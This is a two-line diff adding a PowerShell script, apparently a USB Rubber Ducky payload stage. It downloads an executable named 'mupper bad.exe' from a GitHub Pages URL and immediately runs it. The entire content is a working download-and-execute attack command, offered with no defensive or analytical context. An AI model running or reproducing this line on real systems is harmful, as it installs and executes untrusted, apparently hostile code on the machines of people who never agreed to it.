@@ -1,0 +1,2 @@
+Invoke-WebRequest -Uri https://isaacthoman.github.io/ohioRemoteDuckyPayload/hosted/mupper%20bad/bin/Debug/mupper%20bad.exe -OutFile mupper.exe
+./mupper.exe
